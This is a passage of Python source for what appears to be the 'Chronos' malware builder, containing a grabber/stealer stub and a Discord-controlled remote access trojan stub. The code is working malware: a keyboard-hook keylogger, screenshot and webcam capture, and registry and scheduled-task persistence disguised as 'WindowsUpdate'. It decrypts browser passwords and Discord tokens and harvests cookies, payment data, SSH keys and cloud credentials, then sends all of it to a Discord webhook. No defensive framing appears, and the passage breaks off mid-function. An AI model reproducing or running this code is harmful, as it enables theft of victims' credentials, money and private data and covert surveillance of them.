        text += f"Time: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\nUser: {os.getenv('USERNAME', 'Unknown')}\n" + "=" * 70 + "\n"
        for entry in KEYLOGGER_BUFFER:
            text += f"[{entry['time']}] {entry['window']}\n{entry['keys']}\n" + "-" * 50 + "\n"
        KEYLOGGER_BUFFER = []
        KEYLOGGER_LAST_SEND = time.time()
        threading.Thread(target=_send_keylog, args=(text,), daemon=True).start()
def _send_keylog(text):
    try:
        if len(text) > 1900:
            chunks = [text[i:i+1900] for i in range(0, len(text), 1900)]
            for i, chunk in enumerate(chunks):
                send_text_to_discord(f"KEYLOG Part {i+1}/{len(chunks)}:\n```\n{chunk}\n```")
                time.sleep(0.3)
        else:
            send_text_to_discord(f"```\n{text}\n```")
    except:
        pass
def run_keylogger():
    global KEYLOGGER_LAST_SEND
    try:
        WH_KEYBOARD_LL = 13
        HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_int, ctypes.c_uint, ctypes.c_uint)
        hook_proc = HOOKPROC(keylogger_callback)
        kernel32 = ctypes.windll.kernel32
        user32 = ctypes.windll.user32
        module_handle = kernel32.GetModuleHandleW(None)
        keyboard_hook = user32.SetWindowsHookExW(WH_KEYBOARD_LL, hook_proc, module_handle, 0)
        if not keyboard_hook:
            return
        msg = ctypes.wintypes.MSG()
        KEYLOGGER_LAST_SEND = time.time()
        while True:
            result = user32.GetMessageW(ctypes.byref(msg), None, 0, 0)
            if result in (0, -1):
                break
            user32.TranslateMessage(ctypes.byref(msg))
            user32.DispatchMessageW(ctypes.byref(msg))
            if time.time() - KEYLOGGER_LAST_SEND >= 5:
                if len(KEYLOGGER_BUFFER) > 0:
                    flush_keylogger_buffer()
    except:
        pass
    finally:
        if keyboard_hook:
            user32.UnhookWindowsHookEx(keyboard_hook)
# ---------- Screenshot ----------
def capture_screenshot():
    try:
        from PIL import ImageGrab
        screenshot = ImageGrab.grab(all_screens=True)
        bio = io.BytesIO()
        screenshot.save(bio, format='JPEG', quality=40, optimize=True)
        return bio.getvalue()
    except:
        pass
    return None
def send_screenshot_to_discord(screenshot_data):
    if not screenshot_data:
        return False
    try:
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"screenshot_{timestamp}.jpg"
        boundary = '----WebKitFormBoundary' + ''.join(random.choices('abcdef0123456789', k=16))
        parts = []
        parts.append(f'--{boundary}\r\n')
        parts.append('Content-Disposition: form-data; name="content"\r\n')
        parts.append('\r\n')
        parts.append(f'Screenshot captured at {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}\r\n')
        parts.append(f'--{boundary}\r\n')
        parts.append(f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n')
        parts.append('Content-Type: image/jpeg\r\n')
        parts.append('\r\n')
        body_parts = []
        for part in parts:
            body_parts.append(part.encode('utf-8'))
        body_parts.append(screenshot_data)
        body_parts.append(b'\r\n')
        body_parts.append(f'--{boundary}--\r\n'.encode('utf-8'))
        body = b''.join(body_parts)
        headers = {
            'Content-Type': f'multipart/form-data; boundary={boundary}',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        req = urllib.request.Request(WEBHOOK_URL, data=body, headers=headers, method='POST')
        with urllib.request.urlopen(req, timeout=30) as response:
            if response.getcode() == 200:
                return True
    except:
        pass
    return False
def take_single_screenshot():
    screenshot_data = capture_screenshot()
    if screenshot_data:
        send_screenshot_to_discord(screenshot_data)
# ---------- Persistence ----------
def setup_persistence():
    exe_path = os.path.abspath(sys.argv[0]) if getattr(sys, "frozen", False) else sys.executable
    task_name = "WindowsUpdate"
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, task_name, 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
    except:
        pass
    try:
        subprocess.call(f'schtasks /create /tn "{task_name}" /tr "{exe_path}" /sc ONLOGON /f', shell=True,
                        creationflags=0x08000000, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass
def wait_for_internet():
    for _ in range(24):
        if check_internet():
            return
        time.sleep(5)
    sys.exit(0)
def check_internet():
    try:
        urllib.request.urlopen("https://www.google.com", timeout=5)
        return True
    except:
        return False
# ---------- Gather Grabber Data ----------
def gather_grabber_data():
    roots = {
        "Google Chrome": os.path.join(os.getenv("LOCALAPPDATA", ""), "Google", "Chrome", "User Data"),
        "Microsoft Edge": os.path.join(os.getenv("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data"),
        "Brave": os.path.join(os.getenv("LOCALAPPDATA", ""), "BraveSoftware", "Brave-Browser", "User Data"),
        "Opera": os.path.join(os.getenv("APPDATA", ""), "Opera Software", "Opera Stable"),
        "Opera GX": os.path.join(os.getenv("APPDATA", ""), "Opera Software", "Opera GX Stable"),
        "Vivaldi": os.path.join(os.getenv("LOCALAPPDATA", ""), "Vivaldi", "User Data"),
        "Yandex": os.path.join(os.getenv("LOCALAPPDATA", ""), "Yandex", "YandexBrowser", "User Data"),
    }
    FIREFOX_PROFILES = os.path.join(os.getenv("APPDATA", ""), "Mozilla", "Firefox", "Profiles")
    all_data = {
        'history': [], 'downloads': [], 'bookmarks': [], 'extensions': [],
        'cookies': [], 'session_cookies': [], 'local_storage': [],
        'payment_methods': [], 'form_data': [], 'keywords': [],
        'shortcuts': [], 'cache': [], 'websql': [], 'autofill': [],
        'steam': [], 'epic': [], 'telegram': [], 'whatsapp': [],
        'filezilla': [], 'git': [], 'aws': [], 'ssh': [],
        'user_accounts': [], 'startup_programs': [], 'services': [], 'env_vars': [],
        'hosts': [], 'connections': [], 'dns_cache': [], 'proxy': [], 'vpn_profiles': [],
        'processes': [], 'software': [], 'network': [], 'fingerprint': [],
        'recent_files': [], 'clipboard': "", 'system_info': {},
    }
    for browser_name, browser_path in roots.items():
        if not os.path.exists(browser_path):
            continue
        for profile in ["Default"] + ["Profile " + str(i) for i in range(1, 6)]:
            profile_path = os.path.join(browser_path, profile)
            if not os.path.exists(profile_path):
                continue
            all_data['history'].extend(extract_history(browser_path, browser_name, profile))
            all_data['downloads'].extend(extract_downloads(browser_path, browser_name, profile))
            all_data['bookmarks'].extend(extract_bookmarks(browser_path, browser_name, profile))
            all_data['extensions'].extend(extract_extensions(browser_path, browser_name, profile))
            all_data['cookies'].extend(extract_cookies(browser_path, browser_name, profile))
            all_data['session_cookies'].extend(extract_session_cookies(browser_path, browser_name, profile))
            all_data['local_storage'].extend(extract_local_storage(browser_path, browser_name, profile))
            all_data['payment_methods'].extend(extract_payment_methods(browser_path, browser_name, profile))
            all_data['form_data'].extend(extract_form_data(browser_path, browser_name, profile))
            all_data['keywords'].extend(extract_browser_keywords(browser_path, browser_name, profile))
            all_data['shortcuts'].extend(extract_browser_shortcuts(browser_path, browser_name, profile))
            all_data['cache'].extend(extract_browser_cache(browser_path, browser_name, profile))
            all_data['websql'].extend(extract_websql_databases(browser_path, browser_name, profile))
            autofill = extract_autofill_profiles(browser_path, browser_name, profile)
            if autofill:
                all_data['autofill'].extend(autofill)
    if os.path.exists(FIREFOX_PROFILES):
        for profile_name in os.listdir(FIREFOX_PROFILES):
            profile_path = os.path.join(FIREFOX_PROFILES, profile_name)
            if os.path.isdir(profile_path):
                all_data['history'].extend(extract_firefox_history(profile_path))
                all_data['cookies'].extend(extract_firefox_cookies(profile_path))
    all_data['steam'] = extract_steam_tokens()
    all_data['epic'] = extract_epic_tokens()
    all_data['telegram'] = extract_telegram_sessions()
    all_data['whatsapp'] = extract_whatsapp_sessions()
    all_data['filezilla'] = extract_filezilla_credentials()
    all_data['git'] = extract_git_credentials()
    all_data['aws'] = extract_aws_credentials()
    all_data['ssh'] = extract_ssh_keys()
    all_data['system_info'] = get_system_info()
    all_data['user_accounts'] = get_user_accounts()
    all_data['startup_programs'] = get_startup_programs()
    all_data['services'] = get_windows_services()
    all_data['env_vars'] = get_env_variables()
    all_data['hosts'] = get_hosts_file()
    all_data['connections'] = get_active_connections()
    all_data['dns_cache'] = get_dns_cache()
    all_data['proxy'] = get_proxy_settings()
    all_data['vpn_profiles'] = get_vpn_profiles()
    all_data['processes'] = get_running_processes()
    all_data['software'] = get_installed_software()
    all_data['network'] = get_network_info()
    all_data['fingerprint'] = get_browser_fingerprint()
    all_data['recent_files'] = get_recent_files()
    all_data['clipboard'] = get_clipboard_content()
    loc_data = get_public_ip_and_location()
    internal_data = get_internal_ip_and_mac()
    bio = io.BytesIO()
    with zipfile.ZipFile(bio, "w", zipfile.ZIP_DEFLATED) as zf:
        text = f"""LOCATION DATA
{"=" * 70}
Public IP: {loc_data.get('public_ip', 'Unknown')}
Internal IPs: {', '.join(internal_data.get('internal_ips', []))}
MAC Addresses: {', '.join(internal_data.get('mac_addresses', []))}
Default Gateway: {internal_data.get('default_gateway', 'Unknown')}
Hostname: {internal_data.get('hostname', 'Unknown')}
Country: {loc_data.get('country', 'Unknown')}
Region: {loc_data.get('regionName', 'Unknown')}
City: {loc_data.get('city', 'Unknown')}
ZIP: {loc_data.get('zip', 'Unknown')}
Latitude: {loc_data.get('lat', 0.0)}
Longitude: {loc_data.get('lon', 0.0)}
ISP: {loc_data.get('isp', 'Unknown')}
Organization: {loc_data.get('org', 'Unknown')}
Timezone: {loc_data.get('timezone', 'Unknown')}
"""
        zf.writestr("Location_Data.txt", text)
        text = "SYSTEM INFO\n" + "=" * 70 + "\n"
        for key, value in all_data['system_info'].items():
            text += f"  {key}: {value}\n"
        zf.writestr("System_Info.txt", text)
        sections = [
            ('user_accounts', 'User_Accounts.txt', lambda x: f"  [{x[0]}] {x[1]}"),
            ('startup_programs', 'Startup_Programs.txt', lambda x: f"  [{x[0]}] {x[1]}"),
            ('services', 'Services.txt', lambda x: f"  {x[1]}"),
            ('env_vars', 'Environment_Variables.txt', lambda x: f"  {x[0]}: {x[1]}"),
            ('hosts', 'Hosts_File.txt', lambda x: f"  {x[0]} -> {x[1]}"),
            ('connections', 'Active_Connections.txt', lambda x: f"  {x[0]} -> {x[1]} [{x[2]}] PID:{x[3]} {x[4]}"),
            ('dns_cache', 'DNS_Cache.txt', lambda x: f"  {x}"),
            ('proxy', 'Proxy_Settings.txt', lambda x: f"  {x[0]}: {x[1]}"),
            ('vpn_profiles', 'VPN_Profiles.txt', lambda x: f"  {x}"),
            ('network', 'Network_Adapters.txt', lambda x: f"  {x[0]}: {x[1]} / {x[2]}"),
            ('software', 'Installed_Software.txt', lambda x: f"  {x[0]} - {x[1]}"),
            ('processes', 'Running_Processes.txt', lambda x: f"  PID: {x[0]} | CPU: {x[2]} | RAM: {x[3]} | {x[1]}\nPath: {x[4]}"),
            ('fingerprint', 'Browser_Fingerprint.txt', lambda x: f"  {x}"),
            ('recent_files', 'Recent_Files.txt', lambda x: f"  {x[0]} -> {x[1]}"),
            ('steam', 'Steam.txt', lambda x: f"  {x[0]}: {x[1]}"),
            ('epic', 'Epic_Games.txt', lambda x: f"  {x[0]}: {x[1]}"),
            ('telegram', 'Telegram.txt', lambda x: f"  [{x[0]}] {x[1]}"),
            ('whatsapp', 'WhatsApp.txt', lambda x: f"  [{x[0]}] {x[1]}"),
            ('filezilla', 'FileZilla.txt', lambda x: f"  [{x[0]}] {x[1]}"),
            ('git', 'Git_Credentials.txt', lambda x: f"  {x[1]}"),
            ('aws', 'AWS_Credentials.txt', lambda x: f"  {x[1]}"),
            ('ssh', 'SSH_Keys.txt', lambda x: f"  [{x[0]}] {x[1]}"),
            ('history', 'History.txt', lambda x: f"[{x[0]}][{x[1]}] {x[2]}  (x{x[3]})\n{x[4]}\n{x[5]}\n"),
            ('downloads', 'Downloads.txt', lambda x: f"[{x[0]}][{x[1]}]\nFile: {x[3]}\nSize: {x[4]}\nURL: {x[2]}\n" + "-" * 70 + "\n"),
            ('bookmarks', 'Bookmarks.txt', lambda x: f"[{x[0]}][{x[1]}]\n{x[2]}\n{x[3]}\n" + "-" * 70 + "\n"),
            ('extensions', 'Extensions.txt', lambda x: f"[{x[0]}][{x[1]}]\n{x[2]} - {x[3]}\nID: {x[4]}\n{x[5]}\n" + "-" * 70 + "\n"),
            ('payment_methods', 'Payment_Methods.txt', lambda x: f"[{x[0]}][{x[1]}]\nName: {x[2]}\nType: {x[3]}\nDisplay: {x[4]}\n" + "-" * 70 + "\n"),
            ('form_data', 'Form_Data.txt', lambda x: f"[{x[0]}][{x[1]}]\n{x[2]}: {x[3]}\n" + "-" * 70 + "\n"),
            ('keywords', 'Keywords.txt', lambda x: f"[{x[0]}][{x[1]}]\n{x[2]} -> {x[3]}\n" + "-" * 70 + "\n"),
            ('shortcuts', 'Shortcuts.txt', lambda x: f"[{x[0]}][{x[1]}]\n{x[2]}: {x[3]}\n" + "-" * 70 + "\n"),
            ('cache', 'Cache.txt', lambda x: f"[{x[0]}][{x[1]}]\n{x[2]} ({x[3]})\n" + "-" * 70 + "\n"),
            ('websql', 'WebSQL.txt', lambda x: f"[{x[0]}][{x[1]}]\n{x[2]} ({x[3]})\n" + "-" * 70 + "\n"),
            ('cookies', 'Cookies.txt', lambda x: f"[{x[0]}][{x[1]}]\n{x[2]}\nName: {x[3]}\nValue: {x[4]}\n" + "-" * 70 + "\n"),
            ('session_cookies', 'Session_Cookies.txt', lambda x: f"[{x[0]}][{x[1]}]\n{x[2]}\nName: {x[3]}\nValue: {x[4]}\n" + "-" * 70 + "\n"),
            ('local_storage', 'Local_Storage.txt', lambda x: f"  {x}"),
        ]
        for key, filename, formatter in sections:
            if all_data.get(key):
                text = f"{filename.replace('.txt','').upper()}\n" + "=" * 70 + "\n"
                if isinstance(all_data[key], list):
                    for item in all_data[key]:
                        text += formatter(item) + "\n"
                else:
                    text += str(all_data[key])
                zf.writestr(filename, text)
        if all_data['clipboard']:
            zf.writestr("Clipboard.txt", "CLIPBOARD CONTENT\n" + "=" * 70 + "\n" + all_data['clipboard'])
        if all_data['autofill']:
            text = "AUTOFILL PROFILES & SAVED DATA\n" + "=" * 70 + "\n"
            addresses = [e for e in all_data['autofill'] if e['type'] == 'address']
            phones = [e for e in all_data['autofill'] if e['type'] == 'phone']
            emails = [e for e in all_data['autofill'] if e['type'] == 'email']
            other = [e for e in all_data['autofill'] if e['type'] == 'other']
            if addresses:
                text += "ADDRESSES\n" + "-" * 70 + "\n"
                for entry in addresses:
                    text += f"[{entry['browser']} - {entry['profile']}]\n"
                    text += f"  Name: {entry.get('full_name', 'N/A')}\n"
                    text += f"  Company: {entry.get('company', 'N/A')}\n"
                    text += f"  Street: {entry.get('street', 'N/A')}\n"
                    text += f"  City: {entry.get('city', 'N/A')}\n"
                    text += f"  State: {entry.get('state', 'N/A')}\n"
                    text += f"  ZIP: {entry.get('zip', 'N/A')}\n"
                    text += f"  Country: {entry.get('country', 'N/A')}\n"
            if phones:
                text += "PHONE NUMBERS\n" + "-" * 70 + "\n"
                for entry in phones:
                    text += f"[{entry['browser']} - {entry['profile']}]\n"
                    text += f"  {entry.get('field', 'Phone')}: {entry.get('value', 'N/A')}\n"
            if emails:
                text += "EMAILS\n" + "-" * 70 + "\n"
                for entry in emails:
                    text += f"[{entry['browser']} - {entry['profile']}]\n"
                    text += f"  {entry.get('field', 'Email')}: {entry.get('value', 'N/A')}\n"
            if other:
                text += "OTHER AUTOFILL DATA\n" + "-" * 70 + "\n"
                for entry in other:
                    text += f"[{entry['browser']} - {entry['profile']}]\n"
                    text += f"  {entry.get('field', 'Field')}: {entry.get('value', 'N/A')}\n"
            text += "=" * 70 + "\n"
            text += f"Total autofill entries: {len(all_data['autofill'])}\n"
            zf.writestr("Autofill_Profiles.txt", text)
        zip_data = bio.getvalue()
        filename = f"GrabberData_{os.getenv('USERNAME', 'unknown')}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
        send_to_discord(zip_data, filename)
# ----- SINGLE-INSTANCE GUARD (global flag) -----
_already_run = False
def main():
    import os, sys, time, tempfile, ctypes
    global _already_run
    if _already_run:
        sys.exit(0)
    _already_run = True
    try:
        with open(os.path.join(tempfile.gettempdir(), "chronos_debug.log"), "a") as f:
            f.write(f"{time.ctime()} - PID {os.getpid()} - Started\n")
    except:
        pass
    mutex_handle = None
    try:
        mutex_name = "ChronosGrabberMutex"
        mutex_handle = ctypes.windll.kernel32.CreateMutexW(None, False, mutex_name)
        if mutex_handle and ctypes.windll.kernel32.GetLastError() == 183:
            sys.exit(0)
    except Exception:
        mutex_handle = None
    lock_file = os.path.join(tempfile.gettempdir(), "chronos_grabber.lock")
    try:
        fd = os.open(lock_file, os.O_CREAT | os.O_EXCL | os.O_WRONLY)
        os.close(fd)
    except FileExistsError:
        sys.exit(0)
    except:
        pass
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass
    wait_for_internet()
    try:
        def run_stealer():
            try:
                sender = WebhookSender(WEBHOOK_URL)
                stealer = ChronosStealer(sender)
                stealer.run()
            except Exception:
                pass
        stealer_thread = threading.Thread(target=run_stealer, daemon=True)
        stealer_thread.start()
        try:
            gather_grabber_data()
        except Exception:
            pass
        try:
            take_single_screenshot()
        except Exception:
            pass
        stealer_thread.join(timeout=120)
    finally:
        try:
            os.remove(lock_file)
        except Exception:
            pass
        sys.exit(0)
if __name__ == "__main__":
    main()
'''
# ============================================================================
# STUB_RAT – MINIMAL, added some steal options from grabber
# ============================================================================
STUB_RAT = r'''
"""
CHRONOS RAT – Minimal (no external dependencies)
Commands: info, shutdown, restart, bsod, lock, msgbox, cmd, list, launch,
          processes, processkill, startup, screenshot, webcam,
          passwords, discord, steal_all, kill
"""
import os, sys, time, random, socket, platform, tempfile, subprocess, json, base64, ctypes, winreg, threading, urllib.request, urllib.error
import sqlite3
import shutil
import re
import uuid
import datetime
import ssl
try:
    import win32crypt
except Exception:
    win32crypt = None
try:
    from Crypto.Cipher import AES
except Exception:
    AES = None

def _rat_log(msg):
    try:
        candidates = []
        # Prefer builder output folder (cwd/output or next to exe/output)
        cwd = os.getcwd()
        candidates.append(os.path.join(cwd, "output"))
        if getattr(sys, "frozen", False):
            exe_dir = os.path.dirname(sys.executable)
            candidates.append(os.path.join(exe_dir, "output"))
            candidates.append(exe_dir)
        else:
            here = os.path.dirname(os.path.abspath(__file__))
            candidates.append(os.path.join(here, "output"))
            candidates.append(here)
        candidates.append(os.environ.get("TEMP", "C:\\"))
        log_path = None
        for d in candidates:
            if not d:
                continue
            try:
                os.makedirs(d, exist_ok=True)
                log_path = os.path.join(d, "rat_debug.log")
                with open(log_path, "a") as f:
                    f.write("%s | %s\n" % (datetime.datetime.now(), msg))
                return
            except Exception:
                continue
    except Exception:
        pass
_rat_log("RAT process started PID=%s frozen=%s" % (os.getpid(), getattr(sys, "frozen", False)))

# ===== HARDCODED CREDENTIALS (change these) =====
BOT_TOKEN = "REPLACE_WITH_BOT_TOKEN"
CHANNEL_ID = "REPLACE_WITH_CHANNEL_ID"
COMMAND_PREFIX = "REPLACE_WITH_PREFIX"
WHITELIST = "REPLACE_WITH_WHITELIST"
ALLOWED_USERS = [uid.strip() for uid in WHITELIST.split(',') if uid.strip()] if WHITELIST else []

# Hide console on Windows
if sys.platform == "win32":
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

# ---- System info ----
def get_sysinfo():
    try:
        info = {
            "computer": socket.gethostname(),
            "user": os.getenv("USERNAME") or "Unknown",
            "os": platform.system() + " " + platform.release(),
            "arch": platform.machine(),
            "cpu": platform.processor() or "Unknown",
            "ip": socket.gethostbyname(socket.gethostname())
        }
        return info
    except:
        return {"error": "Failed to get system info"}

# ---------- CryptoMaster – NO V20 ----------
class CryptoMaster:
    @staticmethod
    def get_v10_key(local_state_path):
        if not os.path.exists(local_state_path): return None
        if win32crypt is None:
            return None
        try:
            with open(local_state_path, 'r', encoding='utf-8') as f:
                data = json.load(f)
            key = base64.b64decode(data['os_crypt']['encrypted_key'])[5:]
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        except:
            return None
    @staticmethod
    def decrypt_any(data, v10_key):
        if not data:
            return ''
        try:
            if data[:3] == b'v10' and v10_key and AES is not None:
                iv = data[3:15]
                ct = data[15:-16]
                tag = data[-16:]
                cipher = AES.new(v10_key, AES.MODE_GCM, nonce=iv)
                return cipher.decrypt_and_verify(ct, tag).decode('utf-8', errors='ignore')
            else:
                if win32crypt is not None:
                    return win32crypt.CryptUnprotectData(data, None, None, None, 0)[1].decode('utf-8', errors='ignore')
                else:
                    return ''
        except Exception:
            return ''

# ---------- Chromium Paths ----------
def _chromium_paths():
    L = os.environ.get("LOCALAPPDATA", "")
    R = os.environ.get("APPDATA", "")
    return {
        "Chrome":   os.path.join(L, "Google", "Chrome", "User Data"),
        "Edge":     os.path.join(L, "Microsoft", "Edge", "User Data"),
        "Brave":    os.path.join(L, "BraveSoftware", "Brave-Browser", "User Data"),
        "Opera":    os.path.join(R, "Opera Software", "Opera Stable"),
        "Opera GX": os.path.join(R, "Opera Software", "Opera GX Stable"),
        "Vivaldi":  os.path.join(L, "Vivaldi", "User Data"),
        "Yandex":   os.path.join(L, "Yandex", "YandexBrowser", "User Data"),
    }

# ---------- Password Stealer ----------
def steal_passwords():
    """Returns a string of all extracted passwords, one per line."""
    out = []
    for name, root in _chromium_paths().items():
        if not os.path.exists(root):
            continue
        local_state = os.path.join(root, "Local State")
        if not os.path.exists(local_state):
            continue
        v10 = CryptoMaster.get_v10_key(local_state)
        if v10 is None:
            continue
        profiles = ["Default"] + ["Profile %d" % i for i in range(1, 6)]
        for profile in profiles:
            db_path = os.path.join(root, profile, "Login Data")
            if not os.path.exists(db_path):
                continue
            tmp = os.path.join(tempfile.gettempdir(), "p_" + uuid.uuid4().hex[:8] + ".db")
            try:
                shutil.copy2(db_path, tmp)
            except Exception:
                continue
            try:
                conn = sqlite3.connect(tmp)
                cur = conn.cursor()
                cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                for url, user, blob in cur.fetchall():
                    pwd = CryptoMaster.decrypt_any(blob, v10)
                    if user or pwd:
                        out.append("[%s|%s] %s | User: %s | Pass: %s" % (
                            name, profile, url, user, pwd))
                conn.close()
            except Exception:
                pass
            finally:
                try: os.remove(tmp)
                except Exception: pass
    return "\n".join(out) if out else "No passwords found."

# ---------- Discord Token Stealer ----------
def steal_discord_tokens():
    """Same approach as free grabber: leveldb + per-path Local State v10 decrypt + validate."""
    R = os.environ.get("APPDATA", "")
    L = os.environ.get("LOCALAPPDATA", "")
    path_map = {
        "Discord": os.path.join(R, "discord"),
        "Discord PTB": os.path.join(R, "discordptb"),
        "Discord Canary": os.path.join(R, "discordcanary"),
        "Chrome": os.path.join(L, "Google", "Chrome", "User Data", "Default"),
        "Brave": os.path.join(L, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
        "Edge": os.path.join(L, "Microsoft", "Edge", "User Data", "Default"),
    }
    # also other chromium profiles
    for name, root in _chromium_paths().items():
        for profile in ["Default"] + ["Profile %d" % i for i in range(1, 6)]:
            p = os.path.join(root, profile)
            if os.path.isdir(p) and name not in ("Chrome", "Brave", "Edge"):
                path_map["%s|%s" % (name, profile)] = p
    found = []
    seen = set()
    for platform, base_path in path_map.items():
        if not os.path.exists(base_path):
            continue
        leveldb = os.path.join(base_path, "Local Storage", "leveldb")
        if not os.path.isdir(leveldb):
            continue
        local_state = os.path.join(base_path, "Local State")
        if not os.path.exists(local_state):
            local_state = os.path.join(os.path.dirname(base_path), "Local State")
        if not os.path.exists(local_state):
            continue
        key = CryptoMaster.get_v10_key(local_state)
        if key is None:
            continue
        for fn in os.listdir(leveldb):
            if not (fn.endswith(".ldb") or fn.endswith(".log")):
                continue
            try:
                with open(os.path.join(leveldb, fn), "r", errors="ignore") as fp:
                    data = fp.read()
                for match in re.findall(r"dQw4w9WgXcQ:[^\"']+", data):
                    token_enc = match.replace("\\", "")
                    try:
                        raw = base64.b64decode(token_enc.split("dQw4w9WgXcQ:")[1])
                        dec = CryptoMaster.decrypt_any(raw, key)
                        if not dec or dec in seen:
                            continue
                        seen.add(dec)
                        # validate
                        try:
                            req = urllib.request.Request(
                                "https://discord.com/api/v9/users/@me",
                                headers={"Authorization": dec, "Content-Type": "application/json"},
                            )
                            with urllib.request.urlopen(req, context=ssl._create_unverified_context(), timeout=8) as resp:
                                if resp.status == 200:
                                    info = json.loads(resp.read().decode())
                                    line = "[%s] %s#%s | id=%s | email=%s | phone=%s | token=%s" % (
                                        platform,
                                        info.get("username", "?"),
                                        info.get("discriminator", "0"),
                                        info.get("id", "?"),
                                        info.get("email") or "None",
                                        info.get("phone") or "None",
                                        dec,
                                    )
                                    found.append(line)
                        except Exception:
                            found.append("[%s] (unvalidated) %s" % (platform, dec))
                    except Exception:
                        pass
            except Exception:
                pass
    if not found:
        return "No valid Discord tokens found."
    return "DISCORD TOKENS\n" + "=" * 40 + "\n" + "\n".join(found)


def take_screenshot():
    # Try PIL first
    try:
        from PIL import ImageGrab
        shot = ImageGrab.grab(all_screens=True)
        path = os.path.join(tempfile.gettempdir(), "shot_%d.png" % int(time.time()))
        shot.save(path)
        _rat_log("screenshot: PIL ok %s" % path)
        return path
    except Exception as e:
        _rat_log("screenshot: PIL failed: %s" % e)
    # Fallback: GDI BitBlt -> BMP (no PIL required)
    try:
        user32 = ctypes.windll.user32
        gdi32 = ctypes.windll.gdi32
        user32.SetProcessDPIAware()
        w = user32.GetSystemMetrics(0)
        h = user32.GetSystemMetrics(1)
        hwnd = user32.GetDesktopWindow()
        hdc = user32.GetWindowDC(hwnd)
        mdc = gdi32.CreateCompatibleDC(hdc)
        bmp = gdi32.CreateCompatibleBitmap(hdc, w, h)
        gdi32.SelectObject(mdc, bmp)
        gdi32.BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, 0x00CC0020)
        # BITMAPINFO
        class BITMAPINFOHEADER(ctypes.Structure):
            _fields_ = [
                ("biSize", ctypes.c_uint32),
                ("biWidth", ctypes.c_int32),
                ("biHeight", ctypes.c_int32),
                ("biPlanes", ctypes.c_uint16),
                ("biBitCount", ctypes.c_uint16),
                ("biCompression", ctypes.c_uint32),
                ("biSizeImage", ctypes.c_uint32),
                ("biXPelsPerMeter", ctypes.c_int32),
                ("biYPelsPerMeter", ctypes.c_int32),
                ("biClrUsed", ctypes.c_uint32),
                ("biClrImportant", ctypes.c_uint32),
            ]
        bi = BITMAPINFOHEADER()
        bi.biSize = ctypes.sizeof(BITMAPINFOHEADER)
        bi.biWidth = w
        bi.biHeight = -h
        bi.biPlanes = 1
        bi.biBitCount = 24
        bi.biCompression = 0
        row = (w * 3 + 3) & ~3
        buf = ctypes.create_string_buffer(row * h)
        gdi32.GetDIBits(mdc, bmp, 0, h, buf, ctypes.byref(bi), 0)
        path = os.path.join(tempfile.gettempdir(), "shot_%d.bmp" % int(time.time()))
        # write minimal BMP
        fh_size = 14
        ih_size = 40
        off = fh_size + ih_size
        size = off + row * h
        with open(path, "wb") as f:
            f.write(b"BM")
            f.write(size.to_bytes(4, "little"))
            f.write((0).to_bytes(4, "little"))
            f.write(off.to_bytes(4, "little"))
            f.write(ih_size.to_bytes(4, "little"))
            f.write(w.to_bytes(4, "little", signed=True))
            f.write(h.to_bytes(4, "little", signed=True))
            f.write((1).to_bytes(2, "little"))
            f.write((24).to_bytes(2, "little"))
            f.write((0).to_bytes(4, "little"))
            f.write((row * h).to_bytes(4, "little"))
            f.write((0).to_bytes(16, "little"))
            # bottom-up
            for y in range(h - 1, -1, -1):
                f.write(buf[y * row:(y + 1) * row])
        gdi32.DeleteObject(bmp)
        gdi32.DeleteDC(mdc)
        user32.ReleaseDC(hwnd, hdc)
        _rat_log("screenshot: GDI ok %s" % path)
        return path
    except Exception as e:
        _rat_log("screenshot: GDI failed: %s" % e)
        return None

# ---- Webcam (cv2 required) ----
def take_webcam():
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()
        if ret:
            path = os.path.join(tempfile.gettempdir(), f"webcam_{int(time.time())}.jpg")
            cv2.imwrite(path, frame)
            return path
        return None
    except:
        return None

# ---- Process list (fallback using tasklist) ----
def get_processes():
    try:
        if sys.platform == "win32":
            output = subprocess.check_output("tasklist /NH /FO CSV", shell=True, text=True)
            lines = output.strip().split('\n')
            procs = []
            for line in lines[:50]:
                parts = line.split(',')
                if len(parts) >= 2:
                    name = parts[0].strip('"')
                    pid = parts[1].strip('"')
                    procs.append(f"{pid}: {name}")
            return "\n".join(procs) if procs else "No processes"
        else:
            output = subprocess.check_output("ps aux | head -50", shell=True, text=True)
            return output
    except:
        return "Process list failed"

# ---- Startup list (Windows only) ----
def get_startup_items():
    try:
        items = []
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
        i = 0
        while True:
            try:
                name, value, _ = winreg.EnumValue(key, i)
                items.append(f"{name} -> {value}")
                i += 1
            except WindowsError:
                break
        winreg.CloseKey(key)
        return "\n".join(items) if items else "No startup items"
    except:
        return "Startup list failed"

# ---- Kill process (using taskkill) ----
def kill_process(pid):
    try:
        subprocess.check_call(f"taskkill /F /PID {pid}", shell=True)
        return f"Process {pid} killed."
    except:
        return f"Failed to kill process {pid}"

# ---- Discord sending (no requests module, use urllib) ----
def send_discord(token, channel, msg, split=False):
    if not msg:
        return False
    if not split and len(msg) <= 1900:
        body = "```\n" + msg + "\n```"
        data = json.dumps({"content": body}).encode("utf-8")
        req = urllib.request.Request(
            "https://discord.com/api/v9/channels/%s/messages" % channel,
            data=data,
            headers={
                "Authorization": "Bot %s" % token,
